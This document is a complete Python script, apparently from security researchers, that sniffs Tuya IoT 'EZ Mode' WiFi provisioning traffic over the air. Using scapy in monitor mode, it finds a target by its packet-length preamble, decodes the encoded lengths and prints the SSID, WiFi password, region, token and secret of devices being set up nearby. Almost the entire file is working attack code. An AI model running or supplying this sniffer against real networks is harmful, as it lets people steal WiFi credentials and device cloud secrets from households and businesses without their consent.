#!/usr/bin/env python3

# Tuya IoT EZ Mode (Tuya Link) WiFi Credential Sniffer

#+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++++++:--/++++++++++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++++/:-......-:/++++++++++++++++++++++++++++++++
#++++++++++++++++++++++/////::-..............-:://///+++++++++++++++++++++++
#++++++++++++++++++++++..............-:..............+++++++++++++++++++++++
#++++++++++++++++++++++..........-://+++/:-..........+++++++++++++++++++++++
#++++++++++++++++++++++......://++++++++++++//::.....+++++++++++++++++++++++
#++++++++++++++++++++++......++++++++++++++++++/.....+++++++++++++++++++++++
#++++++++++++++++++++++......:/+++++++++++++++/-.....+++++++++++++++++++++++
#++++++++++++++++++++++.........--::////:::--........+++++++++++++++++++++++
#++++++++++++++++++++++-...........................:/+++++++++++++++++++++++
#++++++++++++++++++++++:.....-................--:/++++++++++++++++++++++++++
#+++++++++++++++++++++++-....-+///::::::::///+++++++++++++++++++++++++++++++
#+++++++++++++++++++++++/.....-/++++++++++++++++/::+++++++++++++++++++++++++
#++++++++++++++++++++++++/-.....-/++++++++/:--...-/+++++++++++++++++++++++++
#++++++++++++++++++++++++++:.......:/++/:.......:+++++++++++++++++++++++++++
#+++++++++++++++++++++++++++/-................-/++++++++++++++++++++++++++++
#+++++++++++++++++++++++++++++/:-..........-:/++++++++++++++++++++++++++++++
#++++++++++++++++++++++++++++++++/:--..--:/+++++++++++++++++++++++++++++++++
#++++++++++++++++++++++++++++++++++++++++++++++++(c) 2020 elttam Pty Ltd.+++
# Author: pritch

from scapy.all import *
import select
from math import ceil
from threading import Timer

# --- update values as necessary ---
# packet length offset which may depend on your device, you're aiming to see a preamble of packet lengths 1,3,6,10 and can used the commented print line in the scan function to help with debugging
offset = 106
# update interface as necessary and ensure it's in monitor mode
interface = "wlan0" 
# ---

scanning = True
timer = None
target_addr = ''
queue = []
header_queue = []
data_queue = [0] * 128
data_length = 0
good_header = False
index = 0
init_seq_num = 0
current_seq_num = 0

def main():
  global interface
  print("[+] Listening for targets ...")
  s = conf.L2listen(iface=interface, filter='type Data and ether dst ff:ff:ff:ff:ff:ff')
  while(1):
    rlist = select.select([s], [], [])
    if rlist:
        pkt = s.recv()
        packet_filter(pkt)
  s.close()
  
def packet_filter(pkt):
  global timer
  if pkt.haslayer(Dot11CCMP):               # 802.11
    if pkt.type == 2:                       # Data packet type
      if pkt.addr1 == 'ff:ff:ff:ff:ff:ff':  # Broadcast (dst addr)
        if scanning:
          scan(pkt)
        else:
          if timer == None:
            timer = Timer(45.0, timeout)
            timer.start()
          if pkt.addr3 == target_addr:
            target(pkt)

def scan(pkt):
  global offset
  global scanning
  global queue
  global target_addr
  head = [1,3,6,10]
  #the print line below can help find the correct offset if needed
  #print(pkt.addr3 + ' --> ' + pkt.addr1 + ' : ' + str(len(pkt)-offset))
  queue.append(len(pkt)-offset)
  if len(queue) > 4:
    queue.pop(0)
    if equal(queue, head):
      scanning = False
      queue.clear()
      target_addr = pkt.addr3
      print("[+] Found target: " + target_addr)
      print("[+] Decoding ...")

def target(pkt):
  global header_queue
  global data_length
  global data_queue
  global good_header
  global init_seq_num
  global current_seq_num
  global index

  if not good_header:
      header_queue.append(pkt)
      if len(header_queue) == 4:
          if check_header():
              queue.clear()
              for x in header_queue:
                  queue.append(len(x)-offset)
              good_header = True
              init_seq_num = header_queue[3].PN0
              current_seq_num = init_seq_num
          else:
              header_queue.pop(0)
  else:
      index = (pkt.PN0 - init_seq_num - 1) % 256
      current_seq_num = (current_seq_num + 1) % 256
      if not index >= data_length:
          data_queue[index] = len(pkt)-offset
      else:
          data = []
          for c in data_queue:
              if not c == 0:
                  data.append(c)
          if len(data) == data_length:
              decode_broadcast_body(data) 
          header_queue.clear()
          good_header = False

def check_header():
  global offset
  global header_queue
  global data_length
  
  slength1 = (len(header_queue[0])-offset - 16) * 16
  slength2 = len(header_queue[1])-offset - 32
  clength1 = (len(header_queue[2])-offset - 48) * 16
  clength2 = len(header_queue[3])-offset - 64
  slength = slength1 + slength2
  clength = clength1 + clength2
  slength_crc = crc_8([slength])

  if clength == slength_crc:
      data_length = ceil(slength / 4) * 6
      return True
  return False

def decode_broadcast_body(encoded):
  data = []
  for i in range(0, len(encoded), 6):
    crc = encoded[i]-128              # group crc
    crcData = [0]*5
    crcData[0] = encoded[i+1]-128     # sequence number
    crcData[1] = encoded[i+2]-256     # data
    crcData[2] = encoded[i+3]-256     # data
    crcData[3] = encoded[i+4]-256     # data
    crcData[4] = encoded[i+5]-256     # data
    crc_value = crc_8(crcData) % 128
    if not crc == crc_value:
      #print("CRC CHECK FAILED")
      return
    else:
        data.extend(crcData[1:])

  password = ""
  password_len_index = 0
  password_index = password_len_index + 1
  password_len = data[password_len_index]
  for i in range(password_index, password_index+password_len):
    password += chr(data[i])
  
  token_group = ""
  token_group_len_index = password_index + password_len
  token_group_index = token_group_len_index + 1
  token_group_len = data[token_group_len_index]
  for i in range(token_group_index, token_group_index+token_group_len):
    token_group += chr(data[i])
  
  ssid = ""
  ssid_index = token_group_index + token_group_len
  for b in data[ssid_index:]:
    ssid += chr(b)
  
  print("REGION:\"" + token_group[:2] + 
        "\"  TOKEN:\"" + token_group[2:10] + 
        "\"  SECRET:\"" + token_group[10:] + 
        "\"  SSID:\"" + ssid + 
        "\"  PASSWORD:\"" + password + "\"")

def equal(arr1, arr2):
  result = True
  if len(arr1) != len(arr2):
    result = False
  else:
    for i in range(len(arr1)-1):
      if arr1[i] != arr2[i]:
        result = False
        break
  return result

def timeout():
  global scanning
  global timer
  global queue
  print('[!] Timeout -- Listening for targets ...') 
  scanning = True
  timer = None
  queue.clear()

def crc_8_byte(b ):
  r = 0
  for i in range(8):
    if (r ^ b) & 1:
      r ^= 0x18
      r >>= 1
      r |= 0x80
    else:
      r >>= 1
    b >>= 1
  return r

def crc_8(a):
  r = 0
  for b in a:
    r = crc_8_byte(r^b)
  return r

main()
